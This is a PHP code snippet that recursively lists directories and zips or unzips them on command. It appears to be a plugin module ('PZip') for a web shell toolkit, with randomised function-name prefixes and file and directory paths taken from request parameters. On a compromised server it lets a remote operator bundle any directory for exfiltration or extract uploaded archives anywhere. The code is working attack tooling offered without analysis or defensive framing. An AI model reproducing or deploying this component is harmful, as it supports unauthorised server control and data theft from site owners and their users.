function f0bad2listdir($start_dir='.') {
    $files = array();
    if (is_dir($start_dir)) {
        $fh = opendir($start_dir);
        while (($file = readdir($fh)) !== false) {
            if(strcmp($file, '.')==0 || strcmp($file, '..')==0){
                continue;
            }
            $filepath = $start_dir . '/' . $file;
            if(is_dir($filepath)){
                $files = array_merge($files, f0bad2listdir($filepath));
            }else{
                array_push($files, $filepath);
            }
        }
        closedir($fh);
    }else{
        $files = false;
    }
    return $files;
}
function f0bad2ZipCompress($filename,$dirPath){
    set_time_limit(0);
    $zip = new ZipArchive();
    if ($zip->open($filename, ZIPARCHIVE::CREATE)!==TRUE) {
        return "No Permission!";
    }
    $files = f0bad2listdir($dirPath);
    foreach($files as $path){
        $_filename=str_replace("//","/",str_replace("./","",str_replace("\\","/",$path)));
        $zip->addFile($path,substr($_filename,strlen($dirPath),strlen($path)-strlen($dirPath)));

    }
    $ret="ok fileNum: " . $zip->numFiles." >> ".$filename;
    $zip->close();
    return $ret;
}
function f0bad2ZipUnCompress($filename,$dirPath){
    set_time_limit(0);
    $zip = new ZipArchive();

    if ($zip->open($filename) === TRUE) {//中文文件名要使用ANSI编码的文件格式
        if ($zip->extractTo($dirPath)){
            $ret="ok fileNum: " . $zip->numFiles." >> ".$dirPath;
            $zip->close();
            return $ret;
        }else{
            $zip->close();
            return "fail";
        }
    } else {
        return "No Permission!";
    }
}

$methodName=get("methodName");
$filename = get("compressFile");
$dirPath=get("compressDir");
if ($methodName==="zip"){
    return f0bad2ZipCompress($filename,$dirPath);
}else if ($methodName=="unZip"){
    return f0bad2ZipUnCompress($filename,$dirPath);
}else{
    return "PZip: NoMethod";
}